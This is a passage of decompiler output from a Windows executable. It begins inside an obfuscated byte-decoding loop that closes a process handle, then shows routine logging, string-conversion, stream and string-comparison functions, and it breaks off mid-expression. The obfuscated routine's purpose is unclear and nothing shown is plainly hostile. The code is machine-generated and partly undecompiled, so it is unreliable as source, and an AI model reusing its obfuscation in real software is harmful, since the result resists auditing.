              cVar19 = bVar3 + (cVar13 + 0xb0U & bVar3) * -2 + -0x20;
              uVar17 = uVar18;
              goto LAB_140026c10;
            }
            if (uVar1 <= uVar17 + 0x31a) {
              uVar7 = uVar17 + 0x2a4;
              uVar18 = uVar17 + 0x2c4;
            }
          }
        }
        local_1d8 = bVar3 + (cVar13 - 0x16U & bVar3) * -2 + -0x7c + cVar13;
        uVar17 = uVar18;
      }
      if (uVar17 + 100 <= uVar7) {
        if (uVar7 == uVar17 + 1) {
          local_1d8 = (cVar13 + bVar3 + (cVar13 + 0xacU & bVar3) * -2) - 8;
          uVar14 = uVar14 + (byte)acStack_157[uVar14 - 0x71] + uVar17 + 1;
        }
        else if (uVar7 == uVar17 + 3) {
          local_1d8 = (' ' - (cVar13 + 0xa0U & bVar3)) * '\x02' + bVar3 + cVar13;
          uVar14 = uVar14 - local_1d8;
        }
        else if (uVar7 == uVar17 + 2) {
          local_1d8 = ('8' - (cVar13 + 0x98U & bVar3)) * '\x02' + bVar3 + cVar13;
LAB_140026c74:
          acStack_157[uVar14 - 0x71] =
               bVar3 + (bVar3 & cVar13 + 0x2eU) * -2 + -0x42 + cVar13 + 0x2eU + local_1d8;
LAB_140026ca9:
          uVar14 = uVar14 - local_1d8;
          uVar7 = uVar7 + uVar17;
        }
        else {
          if (uVar7 != uVar17 + 5) goto LAB_140026800;
          local_1d8 = cVar13 + bVar3 + (cVar13 + 0x90U & bVar3) * -2 + 0xa0;
          uVar17 = uVar17 + 1;
        }
        goto LAB_140026343;
      }
      cVar19 = ('\x06' - (cVar13 - 2U & bVar3)) * '\x02' + bVar3;
LAB_1400267fd:
      local_1d8 = cVar19 + cVar13;
LAB_140026800:
      if (uVar17 + uVar7 == 8) {
        local_1d8 = (cVar13 + (cVar13 + 0x2cU & bVar3) * -2) - 8;
LAB_140026cdd:
        bVar12 = bVar3 + (bVar3 & cVar13 + 0x2aU) * -2 + -0x26 + cVar13 + 0x2aU;
        acStack_157[uVar14 - 0x71] = bVar12;
        uVar14 = uVar14 - ((ulonglong)bVar12 + uVar17 + 1);
        uVar17 = uVar17 + 1;
LAB_140026d06:
        bVar12 = (char)uVar14 + 0x28;
        acStack_157[uVar14 - 0x71] = bVar3 + (bVar3 & bVar12) * -2 + -0x18 + bVar12;
        lVar15 = uVar14 + (-1 - (uVar7 + 1));
        uVar14 = lVar15 + (byte)acStack_157[lVar15 + -0x71] + uVar17 + 1;
        uVar7 = uVar7 + 1;
        goto LAB_140026343;
      }
      if (uVar17 + 0x42 < uVar7) {
        cVar19 = bVar3 + (cVar13 + 0x86U & bVar3) * -2 + -0x24;
LAB_1400267b8:
        local_1d8 = cVar19 + cVar13;
LAB_1400267bb:
        if (0x3f < uVar7) {
          local_1d8 = bVar3 * '\x02' + (cVar13 + 0x30U & bVar3) * -2 + -0x20 + cVar13;
          goto LAB_140026c74;
        }
        if (uVar17 + 0x1000 < uVar7) {
          cVar19 = bVar3 + (cVar13 + 0x5cU & bVar3) * -2 + -0x28;
LAB_14002677c:
          local_1d8 = cVar19 + cVar13;
        }
        else {
          if (uVar7 == uVar17 + 1) {
            local_1d8 = (cVar13 + bVar3 + (cVar13 + 0x58U & bVar3) * -2) - 0x10;
            uVar14 = uVar14 + (byte)acStack_157[uVar14 - 0x71] + uVar17 + 1;
            goto LAB_140026343;
          }
          if (uVar7 == uVar17 + 2) {
            local_1d8 = ('\x04' - (cVar13 + 0x54U & bVar3)) * '\x02' + bVar3 + cVar13;
            goto LAB_140026d06;
          }
          if (uVar7 == uVar17 + 5) {
            local_1d8 = ('4' - (cVar13 + 0x44U & bVar3)) * '\x02' + bVar3 + cVar13;
            goto LAB_140026c74;
          }
          if (uVar7 == uVar17 + 7) {
            local_1d8 = cVar13 + bVar3 + (cVar13 + 0x40U & bVar3) * -2 + 0x80;
            goto LAB_140026343;
          }
          if (uVar7 == uVar17 + 6) {
            cVar19 = bVar3 + (cVar13 + 0x38U & bVar3) * -2 + -0x50;
            goto LAB_140026c10;
          }
        }
        if (uVar17 < 0x400) {
LAB_14002675c:
          acStack_157[uVar14 - 0x71] = local_1d8;
          uVar14 = uVar14 + 1;
          goto LAB_140026343;
        }
        local_1d8 = (bVar3 + (cVar13 + 0x34U & bVar3) * -2 + cVar13) * '\x02' + 0x90;
      }
      else {
        if (uVar7 != uVar17 + 1) {
          if (uVar7 != uVar17 + 3) {
            if (uVar7 == uVar17 + 7) {
              local_1d8 = bVar3 + (cVar13 + 0x6aU & bVar3) * -2 + -0x7c + cVar13;
              goto LAB_140026cdd;
            }
            goto LAB_1400267bb;
          }
          local_1d8 = ('6' - (cVar13 + 0x6eU & bVar3)) * '\x02' + bVar3 + cVar13;
          uVar14 = uVar14 - local_1d8;
          goto LAB_140026343;
        }
        cVar19 = bVar3 + (cVar13 + 0x82U & bVar3) * -2 + -0xc;
LAB_140026c10:
        local_1d8 = cVar19 + cVar13;
      }
      acStack_157[uVar14 - 0x71] = bVar3 + (bVar3 & cVar13 + 0x32U) * -2 + -0x5e + cVar13 + 0x32U;
      uVar17 = uVar17 + 1;
      goto LAB_140026343;
    }
    CloseHandle(hProcess);
  }
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  FUN_140024ce0(param_1,&DAT_1400571d0,0);
  return param_1;
}



/* ==================================================================== */
/* FUN_140026f40 @ 140026f40 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140026f40(char *param_1)

{
  code *pcVar1;
  int *piVar2;
  undefined1 auStack_38 [32];
  char *local_18;
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStack_38;
  piVar2 = _errno();
  if (0xf < *(ulonglong *)(param_1 + 0x18)) {
    param_1 = *(char **)param_1;
  }
  *piVar2 = 0;
  strtoul(param_1,&local_18,10);
  if (param_1 == local_18) {
    std::_Xinvalid_argument("invalid stoul argument");
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (*piVar2 == 0x22) {
    std::_Xout_of_range("stoul argument out of range");
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  return;
}



/* ==================================================================== */
/* FUN_140026fd0 @ 140026fd0 */

void FUN_140026fd0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;

  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  FUN_140027110(0,param_1,&local_res10);
  return;
}



/* ==================================================================== */
/* FUN_140027000 @ 140027000 */

void FUN_140027000(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;

  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  FUN_140027110(1,param_1,&local_res10);
  return;
}



/* ==================================================================== */
/* FUN_140027030 @ 140027030 */

void FUN_140027030(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;

  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  FUN_140027110(2,param_1,&local_res10);
  return;
}



/* ==================================================================== */
/* FUN_140027060 @ 140027060 */

void FUN_140027060(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;

  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  FUN_140027110(3,param_1,&local_res10);
  return;
}



/* ==================================================================== */
/* FUN_140027090 @ 140027090 */

void FUN_140027090(void)

{
  if (*(int *)(*(longlong *)ThreadLocalStoragePointer + 4) < DAT_140a619b8) {
    FUN_140051c5c(&DAT_140a619b8);
    if (DAT_140a619b8 == -1) {
      DAT_140a619c0 = GetStdHandle(0xfffffff5);
      _Init_thread_footer(&DAT_140a619b8);
    }
  }
  if (DAT_140a619c0 == (HANDLE)0xffffffffffffffff) {
    return;
  }
                    /* WARNING: Could not recover jumptable at 0x0001400270f9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SetConsoleTextAttribute(DAT_140a619c0,7);
  return;
}



/* ==================================================================== */
/* FUN_140027110 @ 140027110 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140027110(int param_1,undefined8 param_2,undefined8 param_3)

{
  int iVar1;
  BOOL BVar2;
  ulonglong *puVar3;
  longlong lVar4;
  HANDLE hConsoleHandle;
  FILE *_File;
  basic_ostream<char,std::char_traits<char>_> *this;
  WORD wAttributes;
  char *pcVar5;
  undefined8 ***pppuVar6;
  char cVar7;
  undefined8 uVar8;
  undefined1 auStack_4c8 [32];
  undefined8 local_4a8;
  undefined8 local_4a0;
  tm *local_498;
  undefined *local_490;
  char *local_488;
  DWORD local_480 [2];
  undefined8 ***local_478;
  undefined8 uStack_470;
  undefined8 local_468;
  ulonglong uStack_460;
  longlong local_458;
  tm local_450;
  undefined1 local_428 [1024];
  ulonglong local_28;

  local_28 = DAT_14005d040 ^ (ulonglong)auStack_4c8;
  puVar3 = (ulonglong *)FUN_14000ea90();
  local_4a8 = 0;
  local_4a0 = param_3;
  __stdio_common_vsprintf(*puVar3 | 2,local_428,0x400,param_2);
  lVar4 = _Xtime_get_ticks();
  lVar4 = SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(lVar4),8) + lVar4;
  local_458 = (lVar4 >> 0x17) - (lVar4 >> 0x3f);
  local_450.tm_sec = 0;
  local_450.tm_min = 0;
  local_450.tm_hour = 0;
  local_450.tm_mday = 0;
  local_450.tm_mon = 0;
  local_450.tm_year = 0;
  local_450.tm_wday = 0;
  local_450.tm_yday = 0;
  local_450.tm_isdst = 0;
  _localtime64_s(&local_450,&local_458);
  uStack_470 = 0;
  local_468 = 0;
  uStack_460 = 0xf;
  local_478 = (undefined8 ***)0x0;
  if (DAT_140a618c0 != '\0') goto LAB_14002725d;
  DAT_140a618c0 = '\x01';
  hConsoleHandle = GetStdHandle(0xfffffff5);
  if (hConsoleHandle == (HANDLE)0xffffffffffffffff) {
    cVar7 = '\0';
  }
  else {
    _File = (FILE *)__acrt_iob_func(1);
    iVar1 = _fileno(_File);
    iVar1 = _isatty(iVar1);
    if (iVar1 == 0) {
      cVar7 = '\0';
    }
    else {
      local_480[0] = 0;
      BVar2 = GetConsoleMode(hConsoleHandle,local_480);
      if (BVar2 != 0) {
        local_480[0] = local_480[0] | 4;
        BVar2 = SetConsoleMode(hConsoleHandle,local_480[0]);
        if (BVar2 != 0) {
          DAT_140a618c1 = '\x01';
          cVar7 = '\x01';
          goto LAB_140027264;
        }
      }
LAB_14002725d:
      cVar7 = DAT_140a618c1;
    }
  }
LAB_140027264:
  if (param_1 == 0) {
    pcVar5 = "INFO";
LAB_1400272a7:
    uVar8 = 4;
  }
  else {
    if (param_1 == 1) {
      pcVar5 = "WARN";
      goto LAB_1400272a7;
    }
    if (param_1 == 2) {
      uVar8 = 5;
      pcVar5 = "ERROR";
    }
    else {
      if (param_1 != 3) goto LAB_1400272b7;
      uVar8 = 5;
      pcVar5 = "DEBUG";
    }
  }
  FUN_140025ad0(&local_478,pcVar5,uVar8);
LAB_1400272b7:
  FUN_140022e50(cout_exref,&DAT_14005724c);
  if (cVar7 == '\0') {
    if (*(int *)(*(longlong *)ThreadLocalStoragePointer + 4) < DAT_140a619ac) {
      FUN_140051c5c(&DAT_140a619ac);
      if (DAT_140a619ac == -1) {
        DAT_140a619b0 = GetStdHandle(0xfffffff5);
        _Init_thread_footer(&DAT_140a619ac);
      }
    }
    if (DAT_140a619b0 != (HANDLE)0xffffffffffffffff) {
      SetConsoleTextAttribute(DAT_140a619b0,8);
    }
  }
  else {
    FUN_140022e50(cout_exref,&DAT_140057250);
  }
  local_498 = &local_450;
  local_488 = "%Y-%m-%d %H:%M:%S";
  local_490 = &DAT_140057258;
  do {
    local_488 = local_488 + 1;
  } while (*local_488 != '\0');
  FUN_140036ff0(cout_exref,&local_498);
  if (cVar7 == '\0') {
    FUN_140027090();
    FUN_140022e50(cout_exref,&DAT_140057274);
    if (*(int *)(*(longlong *)ThreadLocalStoragePointer + 4) < DAT_140a619c8) {
      FUN_140051c5c(&DAT_140a619c8);
      if (DAT_140a619c8 == -1) {
        DAT_140a619d0 = GetStdHandle(0xfffffff5);
        _Init_thread_footer(&DAT_140a619c8);
      }
    }
    if (DAT_140a619d0 != (HANDLE)0xffffffffffffffff) {
      if (param_1 == 0) {
        wAttributes = 10;
      }
      else if (param_1 == 1) {
        wAttributes = 0xe;
      }
      else if (param_1 == 2) {
        wAttributes = 0xc;
      }
      else if (param_1 == 3) {
        wAttributes = 0xb;
      }
      else {
        wAttributes = (WORD)local_480[0];
      }
      SetConsoleTextAttribute(DAT_140a619d0,wAttributes);
    }
  }
  else {
    FUN_140022e50(cout_exref,&DAT_14005726c);
    FUN_140022e50(cout_exref,&DAT_140057274);
    if (param_1 == 0) {
      FUN_140022e50(cout_exref,&DAT_140057278);
    }
    else if (param_1 == 1) {
      FUN_140022e50(cout_exref,&DAT_140057280);
    }
    else if (param_1 == 2) {
      FUN_140022e50(cout_exref,&DAT_140057288);
    }
    else if (param_1 == 3) {
      FUN_140022e50(cout_exref,&DAT_140057290);
    }
  }
  pppuVar6 = &local_478;
  if (0xf < uStack_460) {
    pppuVar6 = local_478;
  }
  FUN_1400373a0(cout_exref,pppuVar6,local_468);
  if (cVar7 == '\0') {
    FUN_140027090();
  }
  else {
    FUN_140022e50(cout_exref,&DAT_14005726c);
  }
  uVar8 = FUN_140022e50(cout_exref,&DAT_140057298);
  this = (basic_ostream<char,std::char_traits<char>_> *)FUN_140022e50(uVar8,local_428);
  std::basic_ostream<char,std::char_traits<char>_>::operator<<(this,FUN_140037290);
  FUN_140025000(&local_478);
  return;
}



/* ==================================================================== */
/* FUN_140027570 @ 140027570 */
/* DECOMPILE FAILED: Exception while decompiling 140027570: process: timeout
 */

/* ==================================================================== */
/* FUN_140036ff0 @ 140036ff0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

basic_ostream<char,std::char_traits<char>_> *
FUN_140036ff0(basic_ostream<char,std::char_traits<char>_> *param_1,undefined8 *param_2)

{
  basic_ostream<char,std::char_traits<char>_> *this;
  longlong lVar1;
  facet *pfVar2;
  bool bVar3;
  int iVar4;
  locale *plVar5;
  ulonglong uVar6;
  _Locimp *p_Var7;
  __uint64 _Var8;
  undefined8 *puVar9;
  char *pcVar10;
  time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *ptVar11;
  undefined1 auStack_d8 [32];
  basic_ostream<char,std::char_traits<char>_> local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  basic_ostream<char,std::char_traits<char>_> *local_98;
  facet *local_88;
  undefined8 uStack_80;
  basic_ostream<char,std::char_traits<char>_> *local_78;
  bool local_70;
  longlong *local_60;
  undefined1 local_58 [16];
  facet *local_48;
  _Lockit local_40 [8];
  ulonglong local_38;

  local_38 = DAT_14005d040 ^ (ulonglong)auStack_d8;
  local_98 = param_1;
  local_78 = param_1;
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) + 8)
    )();
  }
  bVar3 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
  if (bVar3) {
    this = *(basic_ostream<char,std::char_traits<char>_> **)
            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x50);
    if ((this == (basic_ostream<char,std::char_traits<char>_> *)0x0) || (this == param_1)) {
      local_70 = true;
    }
    else {
      std::basic_ostream<char,std::char_traits<char>_>::flush(this);
      local_70 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
    }
  }
  else {
    local_70 = false;
  }
  if (local_70 == false) goto LAB_140037231;
  plVar5 = (locale *)
           std::ios_base::getloc((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
  std::_Lockit::_Lockit(local_40,0);
  local_48 = DAT_140a618b8;
  uVar6 = FUN_140024c60(id_exref);
  lVar1 = *(longlong *)(plVar5 + 8);
  if (uVar6 < *(ulonglong *)(lVar1 + 0x18)) {
    ptVar11 = *(time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> **)
               (uVar6 * 8 + *(longlong *)(lVar1 + 0x10));
    if (ptVar11 == (time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *)0x0)
    goto LAB_140037103;
  }
  else {
    ptVar11 = (time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *)0x0;
LAB_140037103:
    if (*(char *)(lVar1 + 0x24) == '\0') {
LAB_14003711d:
      if (ptVar11 != (time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *)0x0)
      goto LAB_140037177;
    }
    else {
      p_Var7 = std::locale::_Getgloballocale();
      if (uVar6 < *(ulonglong *)(p_Var7 + 0x18)) {
        ptVar11 = *(time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> **)
                   (uVar6 * 8 + *(longlong *)(p_Var7 + 0x10));
        goto LAB_14003711d;
      }
    }
    ptVar11 = (time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *)local_48;
    if (local_48 == (facet *)0x0) {
      _Var8 = std::time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_>::_Getcat
                        (&local_48,plVar5);
      pfVar2 = local_48;
      if (_Var8 == 0xffffffffffffffff) {
                    /* WARNING: Subroutine does not return */
        FUN_14000f050();
      }
      local_88 = local_48;
      FUN_1400514b8(local_48);
      (**(code **)(*(longlong *)pfVar2 + 8))(pfVar2);
      DAT_140a618b8 = local_48;
      ptVar11 = (time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_> *)local_48;
    }
  }
LAB_140037177:
  std::_Lockit::~_Lockit(local_40);
  if ((local_60 != (longlong *)0x0) &&
     (puVar9 = (undefined8 *)(**(code **)(*local_60 + 0x10))(), puVar9 != (undefined8 *)0x0)) {
    (**(code **)*puVar9)(puVar9,1);
  }
  uStack_80 = *(undefined8 *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48);
  local_88 = (facet *)((ulonglong)local_88 & 0xffffffffffffff00);
  local_a0 = param_2[2];
  local_a8 = param_2[1];
  local_b0 = *param_2;
  local_b8 = param_1[(longlong)*(int *)(*(longlong *)param_1 + 4) + 0x58];
  pcVar10 = (char *)std::time_put<char,std::ostreambuf_iterator<char,std::char_traits<char>_>_>::put
                              (ptVar11,local_58);
  if (*pcVar10 != '\0') {
    std::basic_ios<char,std::char_traits<char>_>::setstate
              ((basic_ios<char,std::char_traits<char>_> *)
               (param_1 + *(int *)(*(longlong *)param_1 + 4)),4,false);
  }
LAB_140037231:
  iVar4 = std::uncaught_exceptions();
  if (iVar4 == 0) {
    std::basic_ostream<char,std::char_traits<char>_>::_Osfx(param_1);
  }
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) +
                0x10))();
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140037290 @ 140037290 */

basic_ostream<char,std::char_traits<char>_> *
FUN_140037290(basic_ostream<char,std::char_traits<char>_> *param_1)

{
  char cVar1;

  cVar1 = std::basic_ios<char,std::char_traits<char>_>::widen
                    ((basic_ios<char,std::char_traits<char>_> *)
                     (param_1 + *(int *)(*(longlong *)param_1 + 4)),'\n');
  std::basic_ostream<char,std::char_traits<char>_>::put(param_1,cVar1);
  std::basic_ostream<char,std::char_traits<char>_>::flush(param_1);
  return param_1;
}



/* ==================================================================== */
/* FUN_1400372d0 @ 1400372d0 */

void FUN_1400372d0(longlong *param_1)

{
  longlong lVar1;
  void *pvVar2;
  longlong lVar3;
  void *_Memory;

  lVar3 = *param_1;
  if (lVar3 != 0) {
    lVar1 = param_1[1];
    for (; lVar3 != lVar1; lVar3 = lVar3 + 0x30) {
      FUN_140025000(lVar3);
    }
    pvVar2 = (void *)*param_1;
    _Memory = pvVar2;
    if ((0xfff < (ulonglong)(((param_1[2] - (longlong)pvVar2) / 0x30) * 0x30)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_1400373a0 @ 1400373a0 */

basic_ostream<char,std::char_traits<char>_> *
FUN_1400373a0(basic_ostream<char,std::char_traits<char>_> *param_1,char *param_2,ulonglong param_3)

{
  basic_ostream<char,std::char_traits<char>_> *this;
  bool bVar1;
  int iVar2;
  int iVar3;
  ulonglong uVar4;
  longlong lVar5;
  longlong lVar6;

  iVar3 = 0;
  uVar4 = *(ulonglong *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x28);
  if (((longlong)uVar4 < 1) || (uVar4 <= param_3)) {
    lVar6 = 0;
  }
  else {
    lVar6 = uVar4 - param_3;
  }
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) + 8)
    )();
  }
  bVar1 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
  if (bVar1) {
    this = *(basic_ostream<char,std::char_traits<char>_> **)
            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x50);
    if ((this == (basic_ostream<char,std::char_traits<char>_> *)0x0) || (this == param_1)) {
      bVar1 = true;
    }
    else {
      std::basic_ostream<char,std::char_traits<char>_>::flush(this);
      bVar1 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
    }
  }
  else {
    bVar1 = false;
  }
  if (bVar1 == false) {
    iVar3 = 4;
  }
  else {
    lVar5 = *(longlong *)param_1;
    if ((*(uint *)(param_1 + (longlong)*(int *)(lVar5 + 4) + 0x18) & 0x1c0) != 0x40) {
      for (; lVar6 != 0; lVar6 = lVar6 + -1) {
        iVar2 = std::basic_streambuf<char,std::char_traits<char>_>::sputc
                          (*(basic_streambuf<char,std::char_traits<char>_> **)
                            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48),
                           (char)param_1[(longlong)*(int *)(*(longlong *)param_1 + 4) + 0x58]);
        if (iVar2 == -1) {
          iVar3 = 4;
          goto LAB_1400374a0;
        }
      }
      lVar5 = *(longlong *)param_1;
    }
    uVar4 = std::basic_streambuf<char,std::char_traits<char>_>::sputn
                      (*(basic_streambuf<char,std::char_traits<char>_> **)
                        (param_1 + (longlong)*(int *)(lVar5 + 4) + 0x48),param_2,param_3);
    if (uVar4 == param_3) {
LAB_1400374a0:
      do {
        if (lVar6 == 0) goto LAB_1400374c8;
        iVar2 = std::basic_streambuf<char,std::char_traits<char>_>::sputc
                          (*(basic_streambuf<char,std::char_traits<char>_> **)
                            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48),
                           (char)param_1[(longlong)*(int *)(*(longlong *)param_1 + 4) + 0x58]);
        if (iVar2 == -1) break;
        lVar6 = lVar6 + -1;
      } while( true );
    }
    iVar3 = 4;
LAB_1400374c8:
    *(undefined8 *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x28) = 0;
  }
  std::basic_ios<char,std::char_traits<char>_>::setstate
            ((basic_ios<char,std::char_traits<char>_> *)
             (param_1 + *(int *)(*(longlong *)param_1 + 4)),iVar3,false);
  iVar3 = std::uncaught_exceptions();
  if (iVar3 == 0) {
    std::basic_ostream<char,std::char_traits<char>_>::_Osfx(param_1);
  }
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) +
                0x10))();
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140037570 @ 140037570 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined4 FUN_140037570(undefined1 (*param_1) [32],undefined1 (*param_2) [32],ulonglong param_3)

{
  ulonglong uVar1;
  ushort uVar2;
  undefined1 auVar3 [32];
  ulonglong uVar4;
  uint uVar5;
  ulonglong uVar6;
  ushort *puVar7;
  uint uVar8;
  undefined1 (*pauVar9) [32];
  undefined4 uVar10;
  undefined1 (*pauVar11) [32];
  undefined1 auVar12 [16];

  uVar4 = 0;
  pauVar9 = param_1;
  pauVar11 = param_2;
  uVar1 = uVar4;
  if ((DAT_140a61888 != 0) && (0xf < param_3)) {
    uVar6 = 0x10;
    do {
      auVar3 = vpcmpeqw_avx2(*pauVar9,*pauVar11);
      uVar8 = (uint)(SUB321(auVar3 >> 7,0) & 1) | (uint)(SUB321(auVar3 >> 0xf,0) & 1) << 1 |
              (uint)(SUB321(auVar3 >> 0x17,0) & 1) << 2 | (uint)(SUB321(auVar3 >> 0x1f,0) & 1) << 3
              | (uint)(SUB321(auVar3 >> 0x27,0) & 1) << 4 |
              (uint)(SUB321(auVar3 >> 0x2f,0) & 1) << 5 | (uint)(SUB321(auVar3 >> 0x37,0) & 1) << 6
              | (uint)(SUB321(auVar3 >> 0x3f,0) & 1) << 7 |
              (uint)(SUB321(auVar3 >> 0x47,0) & 1) << 8 | (uint)(SUB321(auVar3 >> 0x4f,0) & 1) << 9
              | (uint)(SUB321(auVar3 >> 0x57,0) & 1) << 10 |
              (uint)(SUB321(auVar3 >> 0x5f,0) & 1) << 0xb |
              (uint)(SUB321(auVar3 >> 0x67,0) & 1) << 0xc |
              (uint)(SUB321(auVar3 >> 0x6f,0) & 1) << 0xd |
              (uint)(SUB321(auVar3 >> 0x77,0) & 1) << 0xe | (uint)SUB321(auVar3 >> 0x7f,0) << 0xf |
              (uint)(SUB321(auVar3 >> 0x87,0) & 1) << 0x10 |
              (uint)(SUB321(auVar3 >> 0x8f,0) & 1) << 0x11 |
              (uint)(SUB321(auVar3 >> 0x97,0) & 1) << 0x12 |
              (uint)(SUB321(auVar3 >> 0x9f,0) & 1) << 0x13 |
              (uint)(SUB321(auVar3 >> 0xa7,0) & 1) << 0x14 |
              (uint)(SUB321(auVar3 >> 0xaf,0) & 1) << 0x15 |
              (uint)(SUB321(auVar3 >> 0xb7,0) & 1) << 0x16 | (uint)SUB321(auVar3 >> 0xbf,0) << 0x17
              | (uint)(SUB321(auVar3 >> 199,0) & 1) << 0x18 |
              (uint)(SUB321(auVar3 >> 0xcf,0) & 1) << 0x19 |
              (uint)(SUB321(auVar3 >> 0xd7,0) & 1) << 0x1a |
              (uint)(SUB321(auVar3 >> 0xdf,0) & 1) << 0x1b |
              (uint)(SUB321(auVar3 >> 0xe7,0) & 1) << 0x1c |
              (uint)(SUB321(auVar3 >> 0xef,0) & 1) << 0x1d |
              (uint)(SUB321(auVar3 >> 0xf7,0) & 1) << 0x1e | (uint)(byte)(auVar3[0x1f] >> 7) << 0x1f
      ;
      if (uVar8 != 0xffffffff) {
        uVar8 = ~uVar8;
        uVar5 = 0;
        if (uVar8 != 0) {
          for (; (uVar8 >> uVar5 & 1) == 0; uVar5 = uVar5 + 1) {
          }
        }
        uVar10 = 1;
        if (*(ushort *)(*param_1 + ((uVar5 >> 1) + uVar4) * 2) <
            *(ushort *)(*param_2 + ((uVar5 >> 1) + uVar4) * 2)) {
          uVar10 = 0xffffffff;
        }
        return uVar10;
      }
      uVar4 = uVar4 + 0x10;
      uVar6 = uVar6 + 0x10;
      pauVar9 = pauVar9 + 1;
      pauVar11 = pauVar11 + 1;
      uVar1 = uVar4;
    } while (uVar6 <= param_3);
  }
  while (uVar1 + 8 <= param_3) {
    auVar12._0_2_ = -(ushort)(*(short *)*pauVar9 == *(short *)*pauVar11);
    auVar12._2_2_ = -(ushort)(*(short *)(*pauVar9 + 2) == *(short *)(*pauVar11 + 2));
    auVar12._4_2_ = -(ushort)(*(short *)(*pauVar9 + 4) == *(short *)(*pauVar11 + 4));
    auVar12._6_2_ = -(ushort)(*(short *)(*pauVar9 + 6) == *(short *)(*pauVar11 + 6));
    auVar12._8_2_ = -(ushort)(*(short *)(*pauVar9 + 8) == *(short *)(*pauVar11 + 8));
    auVar12._10_2_ = -(ushort)(*(short *)(*pauVar9 + 10) == *(short *)(*pauVar11 + 10));
    auVar12._12_2_ = -(ushort)(*(short *)(*pauVar9 + 0xc) == *(short *)(*pauVar11 + 0xc));
    auVar12._14_2_ = -(ushort)(*(short *)(*pauVar9 + 0xe) == *(short *)(*pauVar11 + 0xe));
    uVar2 = (ushort)(SUB161(auVar12 >> 7,0) & 1) | (ushort)(SUB161(auVar12 >> 0xf,0) & 1) << 1 |
            (ushort)(SUB161(auVar12 >> 0x17,0) & 1) << 2 |
            (ushort)(SUB161(auVar12 >> 0x1f,0) & 1) << 3 |
            (ushort)(SUB161(auVar12 >> 0x27,0) & 1) << 4 |
            (ushort)(SUB161(auVar12 >> 0x2f,0) & 1) << 5 |
            (ushort)(SUB161(auVar12 >> 0x37,0) & 1) << 6 |
            (ushort)(SUB161(auVar12 >> 0x3f,0) & 1) << 7 |
